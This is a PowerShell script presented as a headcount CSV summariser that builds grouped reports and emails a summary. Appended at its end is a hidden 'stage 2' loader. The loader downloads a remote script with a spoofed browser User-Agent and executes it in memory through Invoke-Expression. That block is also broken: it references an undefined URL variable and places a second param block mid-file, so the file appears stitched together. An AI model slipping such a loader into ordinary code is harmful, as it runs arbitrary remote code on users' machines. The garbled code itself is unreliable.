
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.EXAMPLE
    .\Convert-CsvSummary.ps1 -InputCsv C:\Data\exports\headcount.csv
.EXAMPLE
    .\Convert-CsvSummary.ps1 -GroupBy Site -MinAmount 5000
#>

param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$InputCsv = "C:\Data\exports\headcount.csv",

    [string]$OutputPath = 'C:\Logs\reports\headcount-summary-2026-12-06.csv',
    [Parameter(Mandatory = $false)]
    [ValidateSet("Department", 'Site')]
    [string]$GroupBy = 'Site',
    [double]$MinAmount = 5000
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Calibri; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8
$jsonBody = $byGroup | ConvertTo-Json -Depth 3
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = "reporting@adatum.com"
$MailFrom = "bi@adatum.com"

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject "Headcount summary" `
    -Body $summaryBody `
    -SmtpServer "smtp.adatum.com" `
    -Port 587

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://localhost:9001/stage2.ps1",
    [int]$ConnectionTimeout = 114
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $RemoteScript = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($RemoteScript)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $RemoteScript.Length)
    Invoke-Expression $RemoteScript
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 42
